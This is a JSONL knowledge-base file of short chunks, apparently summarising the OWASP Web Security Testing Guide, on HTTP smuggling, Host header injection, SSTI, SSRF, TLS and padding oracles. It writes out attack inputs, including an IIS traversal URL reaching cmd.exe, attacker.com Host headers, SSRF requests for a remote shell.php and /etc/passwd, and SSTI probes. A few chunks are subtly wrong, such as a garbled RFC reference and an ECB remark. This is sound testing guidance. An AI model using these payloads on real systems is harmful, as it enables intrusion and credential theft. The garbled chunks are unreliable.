{"id": "kb-001388", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A significant example of HTTP Smuggling is the ability to bypass application firewalls. This can be done by crafting requests that confuse the firewall and server about the intended data transmission."}
{"id": "kb-001389", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "In a typical unsuccessful attack scenario, certain patterns in the URL (like '..' for directory traversal or 'cmd.exe' for command execution) can easily be detected and blocked by security products."}
{"id": "kb-001390", "section": null, "tags": ["CONF", "HTTP", "PATH"], "source": "wstg-v4.2.pdf", "text": "For example, in an old Unicode directory traversal attack against IIS servers, a request like 'http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+<command_to_execute>' could exploit weak configurations."}
{"id": "kb-001391", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "However, IIS 5.0 has a limit on POST request body sizes (48K) and can truncate incoming data if the Content-Type is not 'application/x-www-form-urlencoded', which can be exploited by crafting larger requests."}
{"id": "kb-001392", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An illustration of this technique involves sending a large POST request with garbage data followed by smaller POST requests that execute the actual attack without being filtered or blocked."}
{"id": "kb-001393", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The crafted request is structured so that parts overlap and are misinterpreted. For instance, Request #1 is large enough to contain Request #2, which makes it invisible to firewalls, but IIS will improperly process it, allowing an attacker's malicious request (Request #4) to execute."}
{"id": "kb-001394", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The attack URL in certain HTTP Smuggling scenarios is not detected by firewalls as it is interpreted as part of a previous request, yet it is correctly parsed and executed by the web server (IIS)."}
{"id": "kb-001395", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Different HTTP-enabled devices can parse HTTP messages in various ways, especially when the messages deviate from the 1005 RFC compliance, which can lead to security vulnerabilities."}
{"id": "kb-001396", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The HTTP protocol restricts the Content-Length header to one instance, but it does not dictate how to handle a case where there are two instances. This inconsistency can lead to HTTP Smuggling attacks, due to varying implementations between devices."}
{"id": "kb-001397", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of HTTP Smuggling is the use of the Content-Length header in a GET message, illustrating how ambiguities can be exploited for attacks."}
{"id": "kb-001398", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "It's crucial to note that HTTP Smuggling does not exploit vulnerabilities within the target web application itself, which can lead to challenges in convincing clients to implement countermeasures."}
{"id": "kb-001399", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing for HTTP Incoming Requests is part of the Web Security Testing Guide, focusing on monitoring HTTP traffic to identify suspicious requests."}
{"id": "kb-001400", "section": null, "tags": ["CLIENT", "CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The objective of testing is to verify the behavior of incoming and outgoing HTTP requests without altering client-side configurations, which helps simulate a production environment."}
{"id": "kb-001401", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common tools that act as HTTP proxies include AppScan, BurpSuite, and ZAP, though they require changes to proxy settings in the browser or client application."}
{"id": "kb-001402", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "To monitor HTTP requests without client-side changes, one can set up a reverse proxy on the web server. This allows inspection of traffic directly on the server side."}
{"id": "kb-001403", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "For Windows, Fiddler is recommended as it can monitor, edit, and replay HTTP requests, while Charles Web Debugging Proxy can be used on Linux platforms."}
{"id": "kb-001404", "section": null, "tags": ["CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The steps for setting up a reverse proxy with Fiddler or Charles include installation, configuration as a reverse proxy, capturing HTTP traffic, inspecting the traffic, and modifying requests for testing purposes."}
{"id": "kb-001405", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Port forwarding can also be utilized to intercept HTTP requests without client-side changes, allowing a proxy server like Charles to forward traffic to the web server. Specific steps for TCP-level network traffic capture are mentioned but not detailed in the provided content. Web security testing techniques can involve monitoring network traffic at the TCP level using tools like TCPDump or WireShark. TCPDump and WireShark are effective for capturing network traffic but do not allow edits to the captured data for testing purposes. Ostinato is a tool that can be used to replay and edit captured TCP packets (PCAP) files."}
{"id": "kb-001406", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The general testing steps include: activating TCPDump or WireShark on the web server to capture network traffic, monitoring the captured PCAP files, editing the PCAP files with Ostinato, and replaying HTTP requests."}
{"id": "kb-001407", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Fiddler and Charles are highly recommended tools for capturing and modifying HTTP traffic because they allow users to easily edit and replay modified HTTP requests."}
{"id": "kb-001408", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For HTTPS web traffic, it is necessary to import the web server's private key into Wireshark to inspect the encrypted message body of the HTTPS traffic. Without this key, the HTTPS message body will be unreadable due to encryption."}
{"id": "kb-001409", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Host Header Injection occurs when a web server processes incoming HTTP requests and relies on the value in the Host header to route to the correct virtual host. If not validated, an attacker can exploit this to redirect requests, perform web cache poisoning, manipulate password resets, or dispatch to the first virtual host on the list."}
{"id": "kb-001410", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Initial testing for Host header injection involves altering the Host header in a request, such as by using an attacker-controlled domain (e.g., 'attacker.com'). The outcome depends on how the web server handles this altered header. For example, this may lead to a 302 redirect to the attacker's domain: 'HTTP/1.1 302 Found Location: http://www.attacker.com/login.php'."}
{"id": "kb-001411", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "If an application has mitigations for standard Host header injection, attackers may utilize the X-Forwarded-Host header to bypass these controls. An example request could be: 'GET / HTTP/1.1 Host: www.example.com X-Forwarded-Host: www.attacker.com'. This illustrates that security must account for multiple headers that could affect routing."}
{"id": "kb-001412", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Web Cache Poisoning: This technique allows an attacker to manipulate a web-cache to serve malicious or 'poisoned' content to users. It can affect the caching proxies run by the application, Content Delivery Networks (CDNs), or other downstream providers, meaning that victims have no control over the content they receive from the application. Example: An attacker may inject something like <link src=\"http://www.attacker.com/link\" /> into the cache, so when a victim accesses the vulnerable application, malicious content is served instead."}
{"id": "kb-001413", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Password Reset Poisoning: This vulnerability arises when the password reset functionality includes the Host header value to create reset links with a generated secret token. If an attacker uses a domain they control, it can lead to phishing attempts when a victim receives the email with a link that contains the attacker's domain. Example: The email might contain a link formatted like http://www.attacker.com/index.php?module=Login&action=resetPassword&token=<SECRET_TOKEN>, allowing the attacker to obtain the reset token and reset the user’s password."}
{"id": "kb-001414", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Server-side Template Injection (SSTI) occurs when user input is improperly embedded in a template, potentially leading to remote code execution on the server. Common technologies that can be exploited for SSTI include templating engines such as Jinja2, Twig, and FreeMaker."}
{"id": "kb-001415", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "SSTI vulnerabilities can arise in features that allow advanced user-supplied markup, such as wiki pages, reviews, marketing applications, and content management systems (CMS). Some template engines implement security mechanisms like sandboxes or allow listing to avert SSTI vulnerabilities."}
{"id": "kb-001416", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example vulnerability in Twig involves the use of the call_user_func function, which executes a callback provided as user input. If this input is unsafe, it can lead to exploitation. The example uses Flask and Jinja2 templating engine to demonstrate a potential security vulnerability."}
{"id": "kb-001417", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "The page function retrieves a 'name' parameter from an HTTP GET request and incorporates it directly into the output through Jinja2 templating, which creates risk for both XSS and SSTI vulnerabilities."}
{"id": "kb-001418", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example payload to exploit the SSTI vulnerability is provided using curl: `$ curl -g 'http://www.target.com/page?name={{7*7}}'` which results in the output: 'Hello 49!'."}
{"id": "kb-001419", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing objectives for identifying SSTI vulnerabilities include: detecting injection vulnerability points, identifying the templating engine, and building the exploit."}
{"id": "kb-001420", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "It is crucial to test for SSTI vulnerabilities in both plaintext and code contexts, where user input can be executed directly within template statements or as HTML code."}
{"id": "kb-001421", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To identify template injection vulnerabilities, testers should construct common template expressions typical for various template engines and observe the server responses to discover which expressions are executed."}
{"id": "kb-001422", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common template expressions include: a{{bar}}b, a{{7*7}}, {var}, ${var}, {{var}}, <%var%>, and [% var %]. These are used in template engines to dynamically create output."}
{"id": "kb-001423", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test for Server-Side Template Injection (SSTI), the tester constructs requests that return either blank or error responses. An example is using a payload like personal_greeting=username<tag>, which results in a blank server response: 'Hello'."}
{"id": "kb-001424", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To break out of a template statement, a payload such as personal_greeting=username}}<tag> can be used, leading to injected HTML: 'Hello user01 <tag>'."}
{"id": "kb-001425", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Identifying the templating engine used in an application involves supplying various template expressions and analyzing the server responses. If manual testing is cumbersome, tools like Tplmap or the Backslash Powered Scanner (Burp Suite extension) can automate this process."}
{"id": "kb-001426", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Building a Remote Code Execution (RCE) exploit requires examining the template documentation for key areas, including basic syntax, security considerations, lists of built-in methods, functions, filters, and variables, as well as extensions and plugins."}
{"id": "kb-001427", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Investigating the 'self' object is crucial, as it may expose other objects, methods, and properties accessible through the template engine. If not available, a brute-force approach to variable names may reveal useful information or avenues for exploitation."}
{"id": "kb-001428", "section": null, "tags": ["API", "AUTHN", "AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "Potential security findings from investigating the template engine can include privilege escalation, information disclosures (like application passwords, API keys, configurations, and environment variables)."}
{"id": "kb-001429", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Server-side Request Forgery (SSRF) is a type of injection attack that occurs when web applications interact with internal or external resources, potentially allowing access to unauthorized actions and internal files."}
{"id": "kb-001430", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Successful SSRF attacks can lead to severe consequences such as exposing sensitive data, internal services, or even cause Remote Code Execution (RCE)."}
{"id": "kb-001431", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives for detecting SSRF vulnerabilities include identifying injection points, testing their exploitability, and assessing the severity of the vulnerability."}
{"id": "kb-001432", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for SSRF involves attempting to make a server unintentionally load or save malicious content, often exploiting local and remote file inclusion vulnerabilities."}
{"id": "kb-001433", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A common approach in testing SSRF is leveraging trust relationships that exist when application servers interact with internal systems, which are typically more vulnerable due to lack of sophisticated controls."}
{"id": "kb-001434", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Payload examples for SSRF testing include using GET requests to load content or access restricted pages, such as using 'GET https://example.com/page?page=https://malicioussite.com/shell.php' to load malicious content or 'GET https://example.com/page?page=http://localhost/admin' to access restricted pages on the local server."}
{"id": "kb-001435", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Trust relationships in web applications often differentiate requests from local machines, which can lead to Server-Side Request Forgery (SSRF) vulnerabilities. An example of a potential SSRF attack is using a GET request to fetch a local file like '/etc/passwd' using the URL 'file:///etc/passwd'. SSRF vulnerabilities can apply to any HTTP method and can also be injected into header and cookie values."}
{"id": "kb-001436", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "With POST requests, SSRF may manifest in a 'blind' manner, as the application might not return immediate feedback. The injected data could be utilized in ways not visible to the direct user, affecting internal functionalities like PDF reports or invoices."}
{"id": "kb-001437", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When generating PDFs from uploaded files, SSRF can be exploited by injecting HTML elements such as <iframe> or <img> with links to internal services, e.g., <iframe src='file:///etc/passwd'>."}
{"id": "kb-001438", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common methods to bypass filters that block localhost or 127.0.0.1 include using alternative representations of 127.0.0.1 (e.g., decimal, octal), obfuscating strings, or registering domains that resolve to 127.0.0.1."}
{"id": "kb-001439", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Utilizing the '@' character in URLs can separate user info from the host to evade input validation, such as 'https://expected-domain@attacker-domain'. URL fragmentation using the '#' character and URL encoding can be used as additional evasion techniques for SSRF attacks. Fuzzing combinations of these techniques can enhance SSRF exploitation."}
{"id": "kb-001440", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "SSRF is challenging to mitigate, and effective remediation often requires implementing allow lists that specify which IPs and URLs are permissible."}
{"id": "kb-001441", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Improper error handling can lead to significant security vulnerabilities in applications, allowing attackers to gain insights into the system and potentially exploit them. Errors can manifest as stack traces, network timeouts, input mismatches, and memory dumps, which can be exploited if not handled correctly."}
{"id": "kb-001442", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Attackers can use error messages to understand the internal APIs, scope of services, and frameworks used within the application, enabling attack chaining."}
{"id": "kb-001443", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Improper error handling can lead to Denial of Service (DoS) attacks, where attackers force the system into unhandled exceptions that disrupt normal operations."}
{"id": "kb-001444", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test for improper error handling, one should identify existing error outputs and analyze what information these outputs provide to the user or developer."}
{"id": "kb-001445", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "By sending unexpected data or pushing the application into edge cases, one can often uncover internal system details through output errors, unless error handling has been properly implemented by the developers."}
{"id": "kb-001446", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Web applications typically run on web servers (e.g., NGINX, Apache, IIS) that require proper error handling to manage HTTP requests effectively. Knowledge of error messages and formats for these servers is essential for testing purposes."}
{"id": "kb-001447", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In web security testing, triggering error messages can help identify vulnerabilities in applications. Common methods include searching for non-existent files or folders to generate 404 errors, requesting existing folders to view server responses for 403 errors or default directory listings, and sending malformed requests that violate HTTP RFC standards."}
{"id": "kb-001448", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Applications are particularly prone to leaking sensitive error messages, such as stack traces, memory dumps, and generic error messages, due to their custom-built nature. Developers must thoroughly handle potential error cases or implement global error-catching mechanisms to prevent information leakage."}
{"id": "kb-001449", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To effectively induce errors in an application, a tester should:\n1. Identify input points where the application expects data.\n2. Analyze the expected input types (e.g., strings, integers, JSON, XML).\n3. Execute focused tests by fuzzing each input point."}
{"id": "kb-001450", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "While fuzzing every possible input can be exhaustive, it's more effective to selectively test inputs that are likely to cause failures, such as malformed JSON or excessively long strings where shorter inputs are expected. Fuzzing should also include edge cases like invalid characters in file names."}
{"id": "kb-001451", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding the service providing error messages is crucial. Testers should refine their fuzzing strategies to elicit more informative responses from integrated services like databases or microservices, as inconsistent error handling can reveal service architecture and potential security weaknesses."}
{"id": "kb-001452", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Error messages can secretly expose sensitive information, sometimes configured to return within a successful status response but containing error details in the body. Testers must be attentive to various representation methods when analyzing responses."}
{"id": "kb-001453", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For remediation, one must refer to proactive controls like handling all errors and exceptions (Proactive Controls C10) and use resources such as the Error Handling Cheat Sheet to implement best practices."}
{"id": "kb-001454", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Web security requires encryption to protect data exchanged between clients and servers, typically implemented using HTTPS and the Transport Layer Security (TLS) protocol."}
{"id": "kb-001455", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "TLS replaces the older Secure Socket Layer (SSL) protocol and includes features such as the ability for the server to present a trusted digital certificate to authenticate its identity to the client."}
{"id": "kb-001456", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "There are numerous identified cryptographic weaknesses in both SSL and TLS protocols, along with vulnerabilities in their implementations that necessitate testing for secure configurations."}
{"id": "kb-001457", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Test objectives for assessing TLS include validating service configurations, reviewing the cryptographic strength and validity of digital certificates, and ensuring that TLS security is properly implemented across applications."}
{"id": "kb-001458", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Transport layer security issues fall into several critical categories, including server configurations and legacy/weak cryptographic protocols: SSLv2 (DROWN), SSLv3 (POODLE), TLSv1.0 (BEAST), EXPORT ciphers (FREAK), NULL ciphers, anonymous ciphers, RC4 ciphers (NOMORE), CBC mode ciphers, TLS compression (CRIME), and weak DHE keys (LOGJAM)."}
{"id": "kb-001459", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Many attacks against TLS, while feasible in lab conditions, require active man-in-the-middle (MitM) interception and significant resources, making them impractical for most attackers outside of state-sponsored endeavors."}
{"id": "kb-001460", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Digital certificates must adhere to specific cryptographic standards: key strength should be at least 2048 bits and the signature algorithm should be at least SHA-256. Legacy algorithms like MD5 and SHA-1 are not to be used."}
{"id": "kb-001461", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A digital certificate is considered valid if it is within its defined validity period, has a maximum lifespan of no more than 398 days if issued after September 1, 2020, and is signed by a trusted certificate authority (CA). The Subject Alternate Name (SAN) must match the hostname of the system; modern browsers ignore the Common Name (CN) field."}
{"id": "kb-001462", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Certificates can be issued for wildcard domains (e.g., *.example.org), which can pose security concerns discussed in resources like the OWASP Transport Layer Security Cheat Sheet."}
{"id": "kb-001463", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Certain implementations of TLS have had known vulnerabilities, including Debian OpenSSL Predictable Random Number Generator (CVE-2008-0166) and OpenSSL Heartbleed (CVE-2014-0160)."}
{"id": "kb-001464", "section": null, "tags": ["CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "When using TLS, applications must be configured securely, including not sending sensitive data over unencrypted channels and setting the HTTP Strict-Transport-Security header."}
{"id": "kb-001465", "section": null, "tags": ["CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Mixed active content refers to active resources loaded over unencrypted HTTP on a secure HTTPS page, which can lead to security vulnerabilities by allowing attackers to modify these resources."}
{"id": "kb-001466", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Content loaded over an insecure connection can leak information or allow attackers to deface pages, though it may not lead to a full compromise. Modern browsers block active content loaded from insecure sources into secure pages. HTTP to HTTPS redirection typically uses a 301 Moved Permanently redirect to guide users to the secure version of a site. The Strict-Transport-Security header is set in the HTTPS version to enforce HTTPS usage in future requests."}
{"id": "kb-001467", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "If attackers intercept the initial request to redirect from HTTP to HTTPS, they can redirect users to malicious sites using tools like sslstrip. To mitigate such attack risks, a site should be added to the HTTP Strict Transport Security (HSTS) preload list."}
{"id": "kb-001468", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "There are various automated scanning tools available for testing SSL/TLS configurations, including Nmap, OWASP O-Saft, sslscan, sslyze, SSL Labs, and testssl.sh."}
{"id": "kb-001469", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Manual testing can also be conducted using command-line tools like openssl s_client and gnutls-cli, but it's essential to ensure the testing tools support the specific protocols and ciphers being evaluated."}
{"id": "kb-001470", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Modern system versions of OpenSSL or GnuTLS may not support outdated and insecure protocols, leading to potential false negatives in testing. It's crucial to verify compatibility with outdated protocols before testing."}
{"id": "kb-001471", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web browsers offer the capability to check the protocols and ciphers used and can indicate if a certificate is trusted or presents warning messages."}
{"id": "kb-001472", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "A padding oracle is a vulnerability that allows an attacker to decrypt encrypted data provided by the client without knowing the encryption key."}
{"id": "kb-001473", "section": null, "tags": ["AUTHZ", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Padding oracles can exploit the information leaked about the validity of the padding after decryption, which may lead to leakage of sensitive data or privilege escalation vulnerabilities."}
{"id": "kb-001474", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Block ciphers operate on data in fixed-size blocks, typically 8 or 16 bytes. If data does not match the block size, it must be padded using specific schemes, such as PKCS#7, which includes values to indicate the number of padding bytes added. Example of PKCS#7 padding: If the padding length is 5 bytes, the value 0x05 is repeated five times following the plaintext."}
{"id": "kb-001475", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An application may reveal a padding error through exceptions (like BadPaddingException), differences in response times, or other side-channels, which can indicate the presence of a padding oracle."}
{"id": "kb-001476", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Certain cryptographic modes enable bit-ﬂipping attacks where altering a bit in the ciphertext influences the plaintext upon decryption, highlighting another risk in encrypted communications."}
{"id": "kb-001477", "section": null, "tags": ["AUTHZ", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Padding oracle attacks can enable an attacker to not only decrypt data but also to encrypt arbitrary plaintexts, potentially manipulating session states and gaining higher privileges in an application."}
{"id": "kb-001478", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Testing for padding oracles should involve identifying encrypted messages, attempting to break their padding, and analyzing error messages returned during testing to exploit vulnerabilities."}
{"id": "kb-001479", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "A block cipher produces cipher text whose length is often a multiple of common block sizes, typically 8 or 16 bytes. This characteristic can be used in analyzing the structure of encrypted data."}
{"id": "kb-001480", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Base64 encoding is frequently utilized, and characteristics of the encoded string can indicate the presence of an initialization vector (IV) prepended to the cipher text."}
{"id": "kb-001481", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "To identify potential behavior related to bit-wise tampering, an application should be tested by modifying the least significant bits of the decrypted values to observe changes in application behavior."}
{"id": "kb-001482", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Three distinct responses should be sought when testing for padding oracles: 1) Successful decryption with correct data, 2) Successful decryption with corrupted data leading to exceptions or error handling, and 3) Decryption failure due to padding errors."}
{"id": "kb-001483", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Padding oracle vulnerabilities occur when different error messages or response timings indicate the success or failure of decryption. Specific exceptions, like 'Padding is invalid and cannot be removed' (in ASP.NET), suggest a padding oracle may be present."}
{"id": "kb-001484", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Secure implementations should aim to provide only two types of responses on decryption attempts: 'ok' for success and 'failed' for errors, to prevent the leakage of internal error states that could reveal information to attackers."}
{"id": "kb-001485", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Integrity of cipher text should be verified using secure mechanisms like HMAC or authenticated modes of operation (e.g., GCM or CCM) to reduce the likelihood of successful attacks. Sensitive data must be protected during transmission, and if it is required to be stored securely, it must also be transmitted securely."}
{"id": "kb-001486", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Transmitting sensitive information over unencrypted channels, such as HTTP, is classified as a security risk. Examples include Basic authentication that sends credentials in plain text."}
{"id": "kb-001487", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Examples of sensitive data include authentication information (credentials, PINs, session identifiers, tokens), legally protected data (credit cards, personal data), and personal identifying information (PII) such as social security numbers, bank account numbers, passports, healthcare information, and credit/debit card numbers."}
{"id": "kb-001488", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing should focus on identifying sensitive information transmitted through various channels, assessing the privacy and security of those channels, and checking for the use of HTTPS versus HTTP or weak ciphers in transmission."}
{"id": "kb-001489", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Important security frameworks and guidelines referenced include OWASP Top 10 and the OWASP ASVS, highlighting the importance of securing data during transit. Basic Authentication over HTTP encodes user credentials instead of encrypting them, leading to potential security vulnerabilities."}
{"id": "kb-001490", "section": null, "tags": ["API", "AUTHN", "AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Example command to test Basic Authentication using curl: `$ curl -kis http://example.com/restricted/` gives a response indicating authorization is required with HTTP status code 401."}
{"id": "kb-001491", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Form-based authentication can also be insecure when credentials are transmitted over HTTP. An example form shows how the action attribute uses HTTP: `<form action=\"http://example.com/login\">`."}
{"id": "kb-001492", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Cookies containing session IDs must be transmitted over secure channels to protect them from interception. If the cookie does not have the secure flag set, it may be sent unencrypted, leading to security issues."}
{"id": "kb-001493", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "An example of cookie settings shows the absence of the Secure flag: `Set-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA;` indicating potential vulnerabilities."}
{"id": "kb-001494", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "**Web Security Testing Techniques**: The guide suggests techniques for testing password-sensitive information in source code or logs, which is crucial for identifying vulnerabilities in web security."}
{"id": "kb-001495", "section": null, "tags": ["AUTHN", "CONF", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "**Hardcoded Sensitive Information**: One technique involves checking for hardcoded passwords or encryption keys in source code or configuration files. This is important for ensuring sensitive information is not easily accessible."}
{"id": "kb-001496", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "**Example Commands**: The text provides an example of a grep command that can be used to search for sensitive terms related to passwords, such as 'Pass', 'password', 'user', etc.: `grep -r –E \"Pass | password | pwd | user | guest | admin | encry | key | decrypt | sharekey\" ./PathToSearch/`"}
{"id": "kb-001497", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Identifying Personally Identifiable Information (PII)**: The next step involves searching for PII, such as phone numbers or email addresses, within logs or source code using grep with a regular expression. The text emphasizes adaptability in the regular expression used based on the format of the PII."}
{"id": "kb-001498", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Key Tools for Testing**: The following tools are mentioned for web security testing: curl (for transferring data), grep (for searching text using patterns), Identity Finder (for finding sensitive information), Wireshark (for network traffic analysis), and TCPDUMP (for packet capturing)."}
{"id": "kb-001499", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Regular Expressions in Security**: The mention of using regular expressions illustrates the importance of pattern recognition in identifying sensitive information in code and logs."}
{"id": "kb-001500", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Incorrect uses of encryption algorithms can lead to sensitive data exposure, key leakage, broken authentication, insecure sessions, and spooﬁng attacks. Weak encryption algorithms such as MD5 and RC4 are not recommended for secure applications."}
{"id": "kb-001501", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "For secure implementations, algorithms and their parameters must be chosen carefully. For instance, Electronic Code Book (ECB) mode is discouraged for asymmetric encryption."}
{"id": "kb-001502", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Using AES128 or AES256 requires that the Initialization Vector (IV) is random and unpredictable. The use of java.util.Random is considered weak; instead, java.security.SecureRandom is recommended."}
